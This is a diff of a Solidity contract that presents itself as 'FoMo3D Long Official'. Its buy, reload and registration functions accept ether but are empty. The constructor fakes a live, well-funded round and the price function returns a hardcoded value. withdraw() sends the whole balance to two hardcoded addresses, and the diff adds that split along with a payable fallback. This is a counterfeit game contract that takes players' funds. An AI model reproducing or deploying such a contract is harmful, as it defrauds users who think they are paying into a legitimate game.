@@ -1,9 +1,9 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract FoMo3Dlong at 0x21f3af6fc2acb6b78452b2021fae5adf6f7150a9
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract FoMo3Dlong at 0x5dbd68d986be747539f23d004083d22f166e0dd7
 */
 pragma solidity ^0.4.24;
 
-contract FoMo3Dlong {
+contract FoMo3Dlong { 
     using SafeMath for *;
     
     string constant public name = "FoMo3D Long Official";
@@ -21,15 +21,26 @@ contract FoMo3Dlong {
     mapping (uint256 => F3Ddatasets.TeamFee) public fees_;
     mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;
 
+	function() public  payable{} //???????
+	  
     function buyXid(uint256 _affCode, uint256 _team) public payable {}
     function buyXaddr(address _affCode, uint256 _team) public payable {}
     function buyXname(bytes32 _affCode, uint256 _team) public payable {}
     function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}    
     function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {} 
     function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) public {}
+	
+	constructor() public
+    {
+        round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
+    }
+	
     function withdraw() public {
-        address aff = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
-        aff.transfer(this.balance);
+        address aff = 0x6b5d2ba1691e30376a394c13e38f48e25634724f;
+        address aff2 = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
+        uint256 _one = this.balance/2;
+        aff.transfer(_one);
+        aff2.transfer(_one);
     }
     function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}  
     function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {} 
@@ -42,7 +53,7 @@ contract FoMo3Dlong {
         view 
         returns(uint256)
     {  
-        return ( 100254831521475310 );
+        return ( 10025483152147531 );
     }
 
     function getTimeLeft()
@@ -129,9 +140,7 @@ contract FoMo3Dlong {
     }
 	
     bool public activated_ = true;
-    function activate() public {
-        round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
-    }
+    function activate() public { }
 	
     function setOtherFomo(address _otherF3D) public {}
 }
